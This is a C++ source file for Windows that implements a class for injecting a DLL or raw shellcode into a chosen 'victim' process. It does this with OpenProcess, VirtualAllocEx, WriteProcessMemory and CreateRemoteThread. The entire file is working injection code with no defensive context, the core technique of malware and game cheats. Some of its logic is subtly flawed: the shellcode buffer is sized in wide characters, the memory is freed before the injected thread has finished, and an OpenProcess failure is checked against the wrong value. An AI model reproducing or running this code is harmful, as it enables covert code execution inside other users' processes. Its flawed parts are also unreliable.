#include "remote_code_executor.h"
#include "domain.h"

#include <TlHelp32.h>
#include <exception>
#include <stdexcept>
#include <string>
#include <string_view>
#include <Windows.h>

void RemoteCodeExecutor::InjectDLL(std::wstring_view dll_path, std::wstring_view victim_proc_name) {
    HANDLE hVictim{ 0 };
    LPVOID allocated_memory{ 0 };
    HANDLE hThread{ 0 };
    try {
        DWORD pid = GetProcessId(victim_proc_name);
        if (!pid) {
            throw std::runtime_error("Can't find "
                + domain::WideCharToString(victim_proc_name.data())
                + " process");
        }

        hVictim = OpenVictimProcess(pid);
        size_t bytes_needed = (dll_path.size() + 1) * sizeof(wchar_t);
        allocated_memory = AllocateMemoryInVictim(hVictim, NULL, bytes_needed);
        WriteToVictimMemory(hVictim, allocated_memory, dll_path.data(), bytes_needed);

        LPVOID load_library = GetLoadLibraryFunc();
        hThread = CreateThreadInVictim(hVictim, load_library, allocated_memory);
        WaitForSingleObject(hThread, 5000);
        DWORD exit_code{ 0 };
        GetExitCodeThread(hThread, &exit_code);
        if (exit_code == 0) {
            throw std::runtime_error("LoadLibrary failed in victim process");
        }
    }
    catch (const std::exception& e) {
        FreeMemoryInVictim(hVictim, allocated_memory, hThread);
        throw std::runtime_error("DLL injection to "
            + domain::WideCharToString(victim_proc_name.data())
            + " error: "
            + e.what());
    }

    try {
        FreeMemoryInVictim(hVictim, allocated_memory, hThread);
    }
    catch (const std::exception& e) {
        throw std::runtime_error("Error while cleaning resources in "
            + domain::WideCharToString(victim_proc_name.data())
            + e.what());
    }
}

void RemoteCodeExecutor::InjectShellcode(const wchar_t* shellcode, 
    SIZE_T shellcode_size, 
    std::wstring_view victim_proc_name) {
    HANDLE hVictim{ 0 };
    LPVOID allocated_memory{ 0 };
    HANDLE hThread{ 0 };
    try {
        hVictim = OpenVictimProcess(GetProcessId(victim_proc_name));
        SIZE_T bytes_needed = (shellcode_size + 1) * sizeof(wchar_t);
        allocated_memory = AllocateMemoryInVictim(hVictim, NULL, bytes_needed);
        WriteToVictimMemory(hVictim, allocated_memory, shellcode, bytes_needed);
        hThread = CreateThreadInVictim(hVictim, allocated_memory, NULL);
    }
    catch (const std::exception& e) {
        FreeMemoryInVictim(hVictim, allocated_memory, hThread);
        throw std::runtime_error("Shellcode injection to "
            + domain::WideCharToString(victim_proc_name.data())
            + " error "
            + e.what());
    }

    try {
        FreeMemoryInVictim(hVictim, allocated_memory, hThread);
    }
    catch (const std::exception& e) {
        throw std::runtime_error("Error while cleaning resources in "
            + domain::WideCharToString(victim_proc_name.data())
            + e.what());
    }
}



HANDLE RemoteCodeExecutor::CreateThreadInVictim(HANDLE hVictim, LPVOID entry, LPVOID params) {
    HANDLE hThread = CreateRemoteThread(
        hVictim,
        NULL, 0,
        (LPTHREAD_START_ROUTINE)entry,
        params,
        0, NULL);

    if (!hThread) {
        throw std::runtime_error("Can't create remote thread: "
            + std::to_string(GetLastError()));
    }
    return hThread;
}

LPVOID RemoteCodeExecutor::GetLoadLibraryFunc() {
    const std::string module = "kernel32.dll";
    const std::string proc = "LoadLibraryW";

    HMODULE hModule = GetModuleHandleA(module.data());
    if (!hModule) {
        throw std::runtime_error("Can't get kernel32.dll");
    }

    LPVOID load_library = GetProcAddress(hModule, proc.data());
    if (!load_library) {
        throw std::runtime_error("Can't get " + proc);
    }
    return load_library;
}

void RemoteCodeExecutor::WriteToVictimMemory(HANDLE hVictim, LPVOID address
    , LPCVOID data_buffer, SIZE_T data_size) {
    if (!hVictim) {
        throw std::runtime_error("Need to open victim process before writing in victim's memory");
    }

    SIZE_T written_bytes = 0;
    if (!WriteProcessMemory(hVictim, address, data_buffer, data_size, &written_bytes)) {
        throw std::runtime_error("Can't write to victim's memory: "
            + std::to_string(GetLastError()));
    }

    if (written_bytes != data_size) {
        throw std::runtime_error("Written data is corrupted");
    }
}

LPVOID RemoteCodeExecutor::AllocateMemoryInVictim(HANDLE hVictim, LPVOID address, SIZE_T size) {
    if (!hVictim) {
        throw std::runtime_error("Need to open victim process before memory allocating");
    }

    LPVOID allocated_memory = VirtualAllocEx(hVictim, address, size
        , MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!allocated_memory) {
        throw std::runtime_error("Can't allocate memory in victim. Error code: "
            + std::to_string(GetLastError()));
    }
    return allocated_memory;
}

void RemoteCodeExecutor::FreeMemoryInVictim(HANDLE hVictim, LPVOID allocated_memory, HANDLE hThread) {
    if (allocated_memory && hVictim) {
        VirtualFreeEx(hVictim, allocated_memory, 0, MEM_RELEASE);
        CloseHandle(hVictim);
        return;
    }
    if (hVictim) {
        CloseHandle(hVictim);
    }
    if (hThread) {
        CloseHandle(hThread);
    }
}

HANDLE RemoteCodeExecutor::OpenVictimProcess(DWORD victim_pid) {
    HANDLE hVictim = OpenProcess(PROCESS_ALL_ACCESS, NULL, victim_pid);
    if (hVictim == INVALID_HANDLE_VALUE) {
        throw std::runtime_error
        ("Can't open process "
            + std::to_string(victim_pid)
            + " : "
            + std::to_string(GetLastError()));
    }
    return hVictim;
}

DWORD RemoteCodeExecutor::GetProcessId(std::wstring_view victim_name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        throw std::runtime_error("Snapshot creating error: "
            + std::to_string(GetLastError()));
    }

    PROCESSENTRY32W proc_entry{};
    proc_entry.dwSize = sizeof(PROCESSENTRY32W);
    if (!Process32FirstW(hSnapshot, &proc_entry)) {
        CloseHandle(hSnapshot);
        throw std::runtime_error("Can't get first process: "
            + std::to_string(GetLastError()));
    }

    do {
        if (std::wstring(proc_entry.szExeFile) == std::wstring(victim_name)) {
            CloseHandle(hSnapshot);
            return proc_entry.th32ProcessID;
        }
    } while (Process32NextW(hSnapshot, &proc_entry));

    CloseHandle(hSnapshot);
    return 0;
}
